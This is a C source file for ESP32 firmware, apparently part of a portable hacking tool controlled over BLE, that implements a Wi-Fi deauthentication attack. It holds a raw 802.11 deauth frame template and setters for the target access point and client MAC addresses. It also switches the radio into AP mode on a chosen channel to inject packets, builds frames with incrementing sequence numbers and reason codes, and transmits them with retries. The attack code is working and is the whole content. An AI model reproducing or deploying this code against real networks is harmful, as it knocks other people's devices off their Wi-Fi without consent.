#include "Deauth.h"


static const char* TAG = "Deauth";

// Deauth Packet
const uint8_t deauth_frame[] = {
    0xC0, 0x00, // Frame Control: Deauth (type=0, subtype=12) (0-1)
    0x3A, 0x01, // Duration (2-3)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (4-9)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (10-15)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (16-21)
    0x00, 0x00, // Sequence number (22-23)
    0x07, 0x00 // Reason code (24-25)
};

// Send Packet
extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool enq);

// Run the attack in freeRTOS task
static TaskHandle_t deauth_task_handle = NULL;

// Target configuration
static uint8_t target_ap[6] = {0};  // router or AP
static uint8_t target_client[6] = {0};  // Device to deauth
static volatile bool wifi_was_promiscuous = false;
static wifi_mode_t original_mode = WIFI_MODE_NULL;
static uint8_t attack_channel = 1;

// Seq counter shared between classic and test
static volatile uint16_t seq_counter = 0;

uint16_t deauth_next_seq(void) {
    seq_counter = (seq_counter + 1) & 0x0FFF;
    return seq_counter;
}

// ======= GETTER =======
uint8_t deauth_get_attack_channel(void) {
    return attack_channel;
}

const uint8_t* deauth_get_ap_target(void) {
    return target_ap;
}

const uint8_t* deauth_get_client_target(void) {
    return target_client;
}

TaskHandle_t deauth_get_task_handle(void) {
    return deauth_task_handle;
}


// ======= SETTER =======
void set_deauth_targets(const uint8_t *ap, const uint8_t *client) {
    if (ap) memcpy(target_ap, ap, 6);
    if (client) memcpy(target_client, client, 6);
    
    ESP_LOGI(TAG, "Deauth targets updated");
}

void set_deauth_channel(uint8_t channel) {
    attack_channel = channel;
    ESP_LOGI(TAG, "Deauth channel set to %d", channel);
}

void deauth_set_task_handle(TaskHandle_t dth) {
    deauth_task_handle = dth;
}



// ======= DEAUTH MANAGEMENT ========

void configure_ble_coexistence(void) {
    // BALANCE : on rend de l'airtime au WiFi (injection + capture) tout en
    // gardant le lien BLE de contrôle vivant. PREFER_BT affamait le WiFi et
    // rendait deauth/capture peu fiables.
    esp_coex_preference_set(ESP_COEX_PREFER_BALANCE);

    // Disable WiFi power saving to prevent conflicts
    esp_wifi_set_ps(WIFI_PS_NONE);

    ESP_LOGI(TAG, "BLE coexistence configured (BALANCE)");
}

// Save current WiFi state and switch to AP mode for packet injection
void prepare_for_injection(void) {
    // Configure BLE protection FIRST
    configure_ble_coexistence();

    // Save current state
    esp_wifi_get_mode(&original_mode);
    // esp_wifi_set_max_tx_power(84); // 84 = 21 dBm
    int8_t power;
    esp_wifi_get_max_tx_power(&power);
    ESP_LOGI(TAG, "Current TX power: %d (%.1f dBm)", power, power / 4.0f);
    wifi_was_promiscuous = false;
    
    // Check if promiscuous mode was enabled
    esp_wifi_get_promiscuous(&wifi_was_promiscuous);
    
    // Disable promiscuous mode
    if (wifi_was_promiscuous) {
        esp_wifi_set_promiscuous(false);
        ESP_LOGI(TAG, "Promiscuous mode disabled");
    }
    
    // Set to AP mode for packet injection
    esp_wifi_set_mode(WIFI_MODE_AP);
    
    // Set channel
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "WiFi switched to AP mode for injection");
    vTaskDelay(pdMS_TO_TICKS(100));  // Let WiFi stabilize
}

// Restore original WiFi state
void restore_wifi_state(void) {
    // Restore balanced coexistence
    esp_coex_preference_set(ESP_COEX_PREFER_BALANCE);

    // Restore original mode
    esp_wifi_set_mode(original_mode);
    
    // Re-enable promiscuous mode if it was on
    if (wifi_was_promiscuous) {
        esp_wifi_set_promiscuous(true);
        ESP_LOGI(TAG, "Promiscuous mode re-enabled");
    }
    
    // Restore channel
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    
    ESP_LOGI(TAG, "WiFi state restored");
}

bool mac_str_to_bytes(const char *mac_str, uint8_t *mac_bytes) {
    if (!mac_str || !mac_bytes) return false;
    if (strlen(mac_str) != 17) return false;

    for (int i = 0; i < 6; i++) {
        char byte_str[3] = { 
            mac_str[i * 3], 
            mac_str[i * 3 + 1], 
            '\0' 
        };

        char *endptr;
        long val = strtol(byte_str, &endptr, 16);
        if (*endptr != '\0' || val < 0 || val > 255) {
            return false;
        }

        mac_bytes[i] = (uint8_t) val;
    }

    return true;
}

// ======= Set and initiate attack =======

// Helper to apply seq number + reason code in the packet
void build_deauth_packet(uint8_t *packet,
                                        const uint8_t *dst,
                                        const uint8_t *src,
                                        const uint8_t *bssid,
                                        uint8_t reason) {
    memcpy(packet, deauth_frame, 26);
    memcpy(&packet[4],  dst,   6);
    memcpy(&packet[10], src,   6);
    memcpy(&packet[16], bssid, 6);

    // seq number increased at each packet
    uint16_t seq = deauth_next_seq();
    packet[22] = (uint8_t)((seq << 4) & 0xF0);
    packet[23] = (uint8_t)((seq >> 4) & 0xFF);

    // Reason code put in parameter
    packet[24] = reason;
    packet[25] = 0x00;
}

esp_err_t send_with_retry(const uint8_t *packet, int max_retries) {
    esp_err_t ret;
    int retry = 0;
    do {
        ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
        if (ret == ESP_OK) return ESP_OK;
        if (ret == ESP_ERR_NO_MEM) {
            vTaskDelay(pdMS_TO_TICKS(20));
            retry++;
        } else {
            ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
            return ret;
        }
    } while (retry < max_retries);
    return ret;
}